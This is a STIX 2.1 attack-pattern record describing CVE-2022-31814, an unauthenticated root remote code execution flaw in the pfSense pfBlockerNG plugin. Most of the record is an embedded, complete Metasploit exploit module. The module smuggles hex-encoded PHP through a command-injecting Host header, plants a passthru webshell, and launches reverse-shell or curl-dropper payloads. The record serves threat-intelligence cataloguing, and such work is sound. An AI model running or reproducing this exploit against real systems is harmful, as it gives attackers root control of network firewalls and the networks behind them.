{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5624f183-dd55-4f1e-ab55-6be26dfa8f11",
    "created": "2024-08-14T17:14:58.955008Z",
    "modified": "2024-08-14T17:14:58.955012Z",
    "name": "pfSense plugin pfBlockerNG unauthenticated RCE as root",
    "description": " pfBlockerNG is a popular pfSense plugin that is not installed by default. It\u2019s generally used to block inbound connections from whole countries or IP ranges. Versions 2.1.4_26 and below are affected by an unauthenticated RCE vulnerability that results in root access. Note that version 3.x is unaffected. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/http/pfsense_pfblockerng_webshell.rb",
            "external_id": "pfsense_pfblockerng_webshell.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-31814"
        },
        {
            "source_name": "reference",
            "url": "https://www.ihteam.net/advisory/pfblockerng-unauth-rce-vulnerability/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::FileDropper\n\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'pfSense plugin pfBlockerNG unauthenticated RCE as root',\n        'Description' => %q{\n          pfBlockerNG is a popular pfSense plugin that is not installed by default. It\u2019s generally used to\n          block inbound connections from whole countries or IP ranges. Versions 2.1.4_26 and below are affected\n          by an unauthenticated RCE vulnerability that results in root access. Note that version 3.x is unaffected.\n        },\n        'Author' => [\n          'IHTeam', # discovery\n          'jheysel-r7' # module\n        ],\n        'References' => [\n          [ 'CVE', '2022-31814' ],\n          [ 'URL', 'https://www.ihteam.net/advisory/pfblockerng-unauth-rce-vulnerability/'],\n          [ 'EDB', '51032' ]\n        ],\n        'License' => MSF_LICENSE,\n        'Platform' => 'unix',\n        'Privileged' => false,\n        'Arch' => [ ARCH_CMD ],\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_openssl'\n              }\n            }\n          ],\n          [\n            'BSD Dropper',\n            {\n              'Platform' => 'bsd',\n              'Arch' => [ARCH_X64],\n              'Type' => :bsd_dropper,\n              'CmdStagerFlavor' => [ 'curl' ],\n              'DefaultOptions' => {\n                'PAYLOAD' => 'bsd/x64/shell_reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 1,\n        'DisclosureDate' => '2022-09-05',\n        'DefaultOptions' => {\n          'SSL' => true,\n          'RPORT' => 443\n        },\n        'Notes' => {\n          'Stability' => [ CRASH_SERVICE_DOWN ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ],\n          'Reliability' => [ REPEATABLE_SESSION, ]\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('WEBSHELL_NAME', [\n          false, 'The name of the uploaded webshell sans the \".php\" ending. This value will be randomly generated if left unset.', nil\n        ])\n      ]\n    )\n  end\n\n  def upload_shell\n    print_status 'Uploading shell...'\n    if datastore['WEBSHELL_NAME'].blank?\n      @webshell_name = \"#{Rex::Text.rand_text_alpha(8..16)}.php\"\n    else\n      @webshell_name = \"#{datastore['WEBSHELL_NAME']}.php\"\n    end\n    @parameter_name = Rex::Text.rand_text_alpha(4..12)\n    print_status(\"Webshell name is: #{@webshell_name}\")\n    web_shell_contents = <<~EOF\n      <?php echo file_put_contents('/usr/local/www/#{@webshell_name}','<?php echo(passthru($_POST[\"#{@parameter_name}\"]));');\n    EOF\n    encoded_php = web_shell_contents.unpack('H*')[0].upcase\n    send_request_raw(\n      'uri' => normalize_uri(target_uri.path, '/pfblockerng/www/index.php'),\n      'headers' => {\n        'Host' => \"' *; echo '16i #{encoded_php} P' | dc | php; '\"\n      }\n    )\n    sleep datastore['WfsDelay']\n    register_file_for_cleanup(\"/usr/local/www/#{@webshell_name}\")\n  end\n\n  def check\n    test_file_name = Rex::Text.rand_text_alpha(4..12)\n    test_file_content = Rex::Text.rand_text_alpha(4..12)\n    test_injection = <<~EOF\n      <?php echo file_put_contents('/usr/local/www/#{test_file_name}','#{test_file_content}');\n    EOF\n    encoded_php = test_injection.unpack('H*')[0].upcase\n    send_request_raw(\n      'uri' => normalize_uri(target_uri.path, '/pfblockerng/www/index.php'),\n      'headers' => {\n        'Host' => \"' *; echo '16i #{encoded_php} P' | dc | php; '\"\n      }\n    )\n    sleep datastore['WfsDelay']\n\n    check_resp = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, \"/#{test_file_name}\")\n    )\n    return Exploit::CheckCode::Safe('Error uploading shell, the system is likely patched.') if check_resp.nil? || !check_resp.code == 200 || !check_resp.body.include?(test_file_content)\n\n    # Clean up test webshell \"/usr/local/www/#{test_file_name}\"\n    clean_up_injection = <<~EOF\n      <?php echo unlink('/usr/local/www/#{test_file_name}');\n    EOF\n    encoded_clean_up = clean_up_injection.unpack('H*')[0].upcase\n    send_request_raw(\n      'uri' => normalize_uri(target_uri.path, '/pfblockerng/www/index.php'),\n      'headers' => {\n        'Host' => \"' *; echo '16i #{encoded_clean_up} P' | dc | php; '\"\n      }\n    )\n    Exploit::CheckCode::Vulnerable\n  end\n\n  def execute_command(cmd, _opts = {})\n    send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, @webshell_name),\n      'headers' => {\n        'Content-Encoding' => 'application/x-www-form-urlencoded; charset=UTF-8'\n      },\n      'vars_post' => {\n        @parameter_name.to_s => cmd\n      }\n    })\n  end\n\n  def exploit\n    upload_shell\n    print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']}\")\n    case target['Type']\n    when :unix_cmd\n      execute_command(payload.encoded)\n    when :bsd_dropper\n      execute_cmdstager\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2022-09-05",
    "x_mitre_platforms": [
        "bsd'"
    ]
}